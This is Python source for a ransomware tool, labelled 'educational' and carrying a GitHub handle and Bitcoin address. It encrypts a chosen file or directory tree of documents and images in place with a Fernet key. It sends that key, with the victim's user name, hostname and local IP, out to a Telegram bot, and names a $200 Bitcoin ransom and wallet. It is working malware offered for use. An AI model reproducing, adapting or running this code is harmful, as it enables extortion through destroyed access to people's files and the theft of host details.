import os
import time
import socket
import cryptography
from cryptography.fernet import *
import time
import telegram
import requests
from datetime import datetime
import threading
import sys

TOKEN = "12222"
chat_id = "TELEGRAM_CHAT_ID_HERE"


keyGen = Fernet.generate_key()
priceToAsk = "$200"
wallet_url = "1HxC5cyAH1Xc1fxNA5hLQjqSdZU9R1e383"
currency = "Bitcoin"

extensions = [
    '.txt',
    '.pdf',
    '.jpg',
    '.png',
    '.xls',
    '.csv',
    '.doc'
]

def banner():
    banner = """
 ________   ______   __        _______    ______   _______   __    __   ______  
|        \ /      \ |  \      |       \  /      \ |       \ |  \  |  \ /      \ 
 \$$$$$$$$|  $$$$$$\| $$      | $$$$$$$\|  $$$$$$\| $$$$$$$\| $$  | $$|  $$$$$$\
    /  $$ | $$__| $$| $$      | $$__/ $$| $$__| $$| $$__| $$| $$  | $$| $$___\$$
   /  $$  | $$    $$| $$      | $$    $$| $$    $$| $$    $$| $$  | $$ \$$    \ 
  /  $$   | $$$$$$$$| $$      | $$$$$$$ | $$$$$$$$| $$$$$$$\| $$  | $$ _\$$$$$$\
 /  $$___ | $$  | $$| $$_____ | $$      | $$  | $$| $$  | $$| $$__/ $$|  \__| $$
|  $$    \| $$  | $$| $$     \| $$      | $$  | $$| $$  | $$ \$$    $$ \$$    $$
 \$$$$$$$$ \$$   \$$ \$$$$$$$$ \$$       \$$   \$$ \$$   \$$  \$$$$$$   \$$$$$$ 
 Use for educational purposes only :)
 
 Github: github.com/dave-zalp
 
 btc: 1HxC5cyAH1Xc1fxNA5hLQjqSdZU9R1e383
 
                                                                                
                                                                                
"""
    print(banner);
    time.sleep(3)

def detect_os():
    if os.name != 'nt':
        sys.exit()





def encryptIndividualFile(File):
    #  File = input("Enter File path to encrypt:  ")
      if os.path.exists(File):
            with open('seckey.txt', 'wb') as _key:
                _key.write(keyGen)
                currentDateAndTime = datetime.now()
                USER = os.getlogin()
                Hostname = socket.gethostname()
                LOCAL_IP = socket.gethostbyname(Hostname)
                keytext = f"key: {keyGen}\n name: {USER}\n Hostname: {Hostname} \n LOCAL-IP: {LOCAL_IP} \nDate: {currentDateAndTime}"
                url1 = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={keytext}"
                try:
                    data = requests.get(url1)
                except requests.exceptions.ConnectionError:
                    print('Connection Error')
                    print('Retrying Requests......')
                    time.sleep(2)
                    print('Ensure you have Internet Connectivity....')
                    time.sleep(6)
                    encryptIndividualFile(File)
                print(data.json())
                with open(File, 'rb') as encfile:
                    contents = encfile.read()
                    contents_encrypted = Fernet(keyGen).encrypt(contents)
                    with open(File, 'wb') as newencfile:
                         newencfile.write(contents_encrypted)
                print('True')
      else:
            print('PATH DOES NOT EXIST')

def decryptIndividualFile():
      File = input("Enter File path to decrypt:  ")
      if os.path.exists(File):
            with open('seckey.txt', 'rb') as _key:
                encrypkey = _key.read()
                with open(File, 'rb') as decfile:
                    contents = decfile.read()
                    contents_decrypted = Fernet(encrypkey).decrypt(contents)
                    with open(File, 'wb') as newdecfile:
                         newdecfile.write(contents_decrypted)
                print(encrypkey)
                print('True')
      else:
            print('PATH DOES NOT EXIST')

def encryptDir():
    res=[]
    Directory = input('Enter Path of Directory: ')
    if os.path.isdir(Directory):
        for root, dirs, files in os.walk(Directory):
            for file in files:
                if file.endswith(".txt") or file.endswith(".csv") or file.endswith(".pdf") or file.endswith(".jpg") or file.endswith(".png") or file.endswith(".xls") or file.endswith(".doc") :
                    res.append(os.path.join(root, file))
        for filepaths in res:
           encryptIndividualFile(filepaths)

    else:
        print('NOT A DIRECTORY')
        os.system('exit')

def main():
    banner()
    detect_os()
    choice = input('Do you want to encript a file or a direcitory? [F/D]:  ')
    if choice == 'F':
        path = input('Enter path of file: ')
        if path == '':
            print('No file Specified! ')
            os.system('exit')
        else:
            encryptIndividualFile(path)
    elif choice == 'D':
        encryptDir()
    else:
        print("[-] INVALID ARGUMENT, choice must be 'F' or 'D' !")
        main()

if __name__ == '__main__':
    main()


